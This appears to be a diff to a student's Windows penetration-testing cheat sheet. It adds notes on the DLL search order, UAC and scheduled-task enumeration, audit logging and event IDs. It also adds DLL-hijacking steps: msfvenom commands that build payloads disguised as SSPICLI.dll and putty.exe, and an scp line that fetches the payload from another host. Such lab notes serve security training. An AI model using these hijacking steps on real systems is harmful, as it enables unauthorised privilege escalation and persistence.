@@ -528,4 +528,88 @@ type <file> 	(Equivilant of Cat in liux)
 tasklist /svc | findstr "<pid #>"
 
 
+# Privilege Escalation, Persistence and coveing tracks
+
+
+DLL Search Order
+
+Executables check the following locations (in successive order):
+
+
+    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+
+    The directory the the Application was run from
+
+    The directory specified in in the C+ function GetSystemDirectory()
+
+    The directory specified in the C+ function GetWindowsDirectory()
+
+    The current directory
+
+DEMO: Checking UAC Settings
+
+	reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+
+DEMO: Finding vulnerable Scheduled Tasks
+
+	schtasks /query /fo LIST /v
+
+
+ 
+DEMO: Audit Logging
+Show all audit category settings
+
+	auditpol /get /category:*
+
+What does the below command show?
+
+	auditpol /get /category:* | findstr /i "success failure"
+
+Important Microsoft Event IDs
+
+	4624/4625 Successful/failed login
+
+	4720 Account created
+
+	4672 Administrative user logged on
+
+	7045 Service created
+
+DEMO: Event Logging
+
+	Storage: c:\windows\system32\config\
+	File-Type: .evtx/.evt
+
+	wevtutil el
+
+	wmic ntevent where "logfile="<LOGNAME>" list full
+
+	Get-Eventlog -List
+
+## Important applications:
+Scheduled Tasks
+
+  	task scheduler
+   	triggers and actions
+
+Services
+
+Registry Run keys
+
+
+## sysinternals suite
+download sysinternals tools onto adversaries box or pull the files and examine them locally with the same suite
+
+procmon
+
+  	process name contains " "
+   	path contains .dll 
+    	Result contains NAME NOT FOUND or (NAME_NOT_FOUND)
+     
+## Dll injection
+
+ 	msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > SSPICLI.dll
+	msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\DemoAdmin\Desktop\whoami.txt' -f dll > putty.exe
+	scp 10.50.22.235:/home/student/putty.exe . 
   
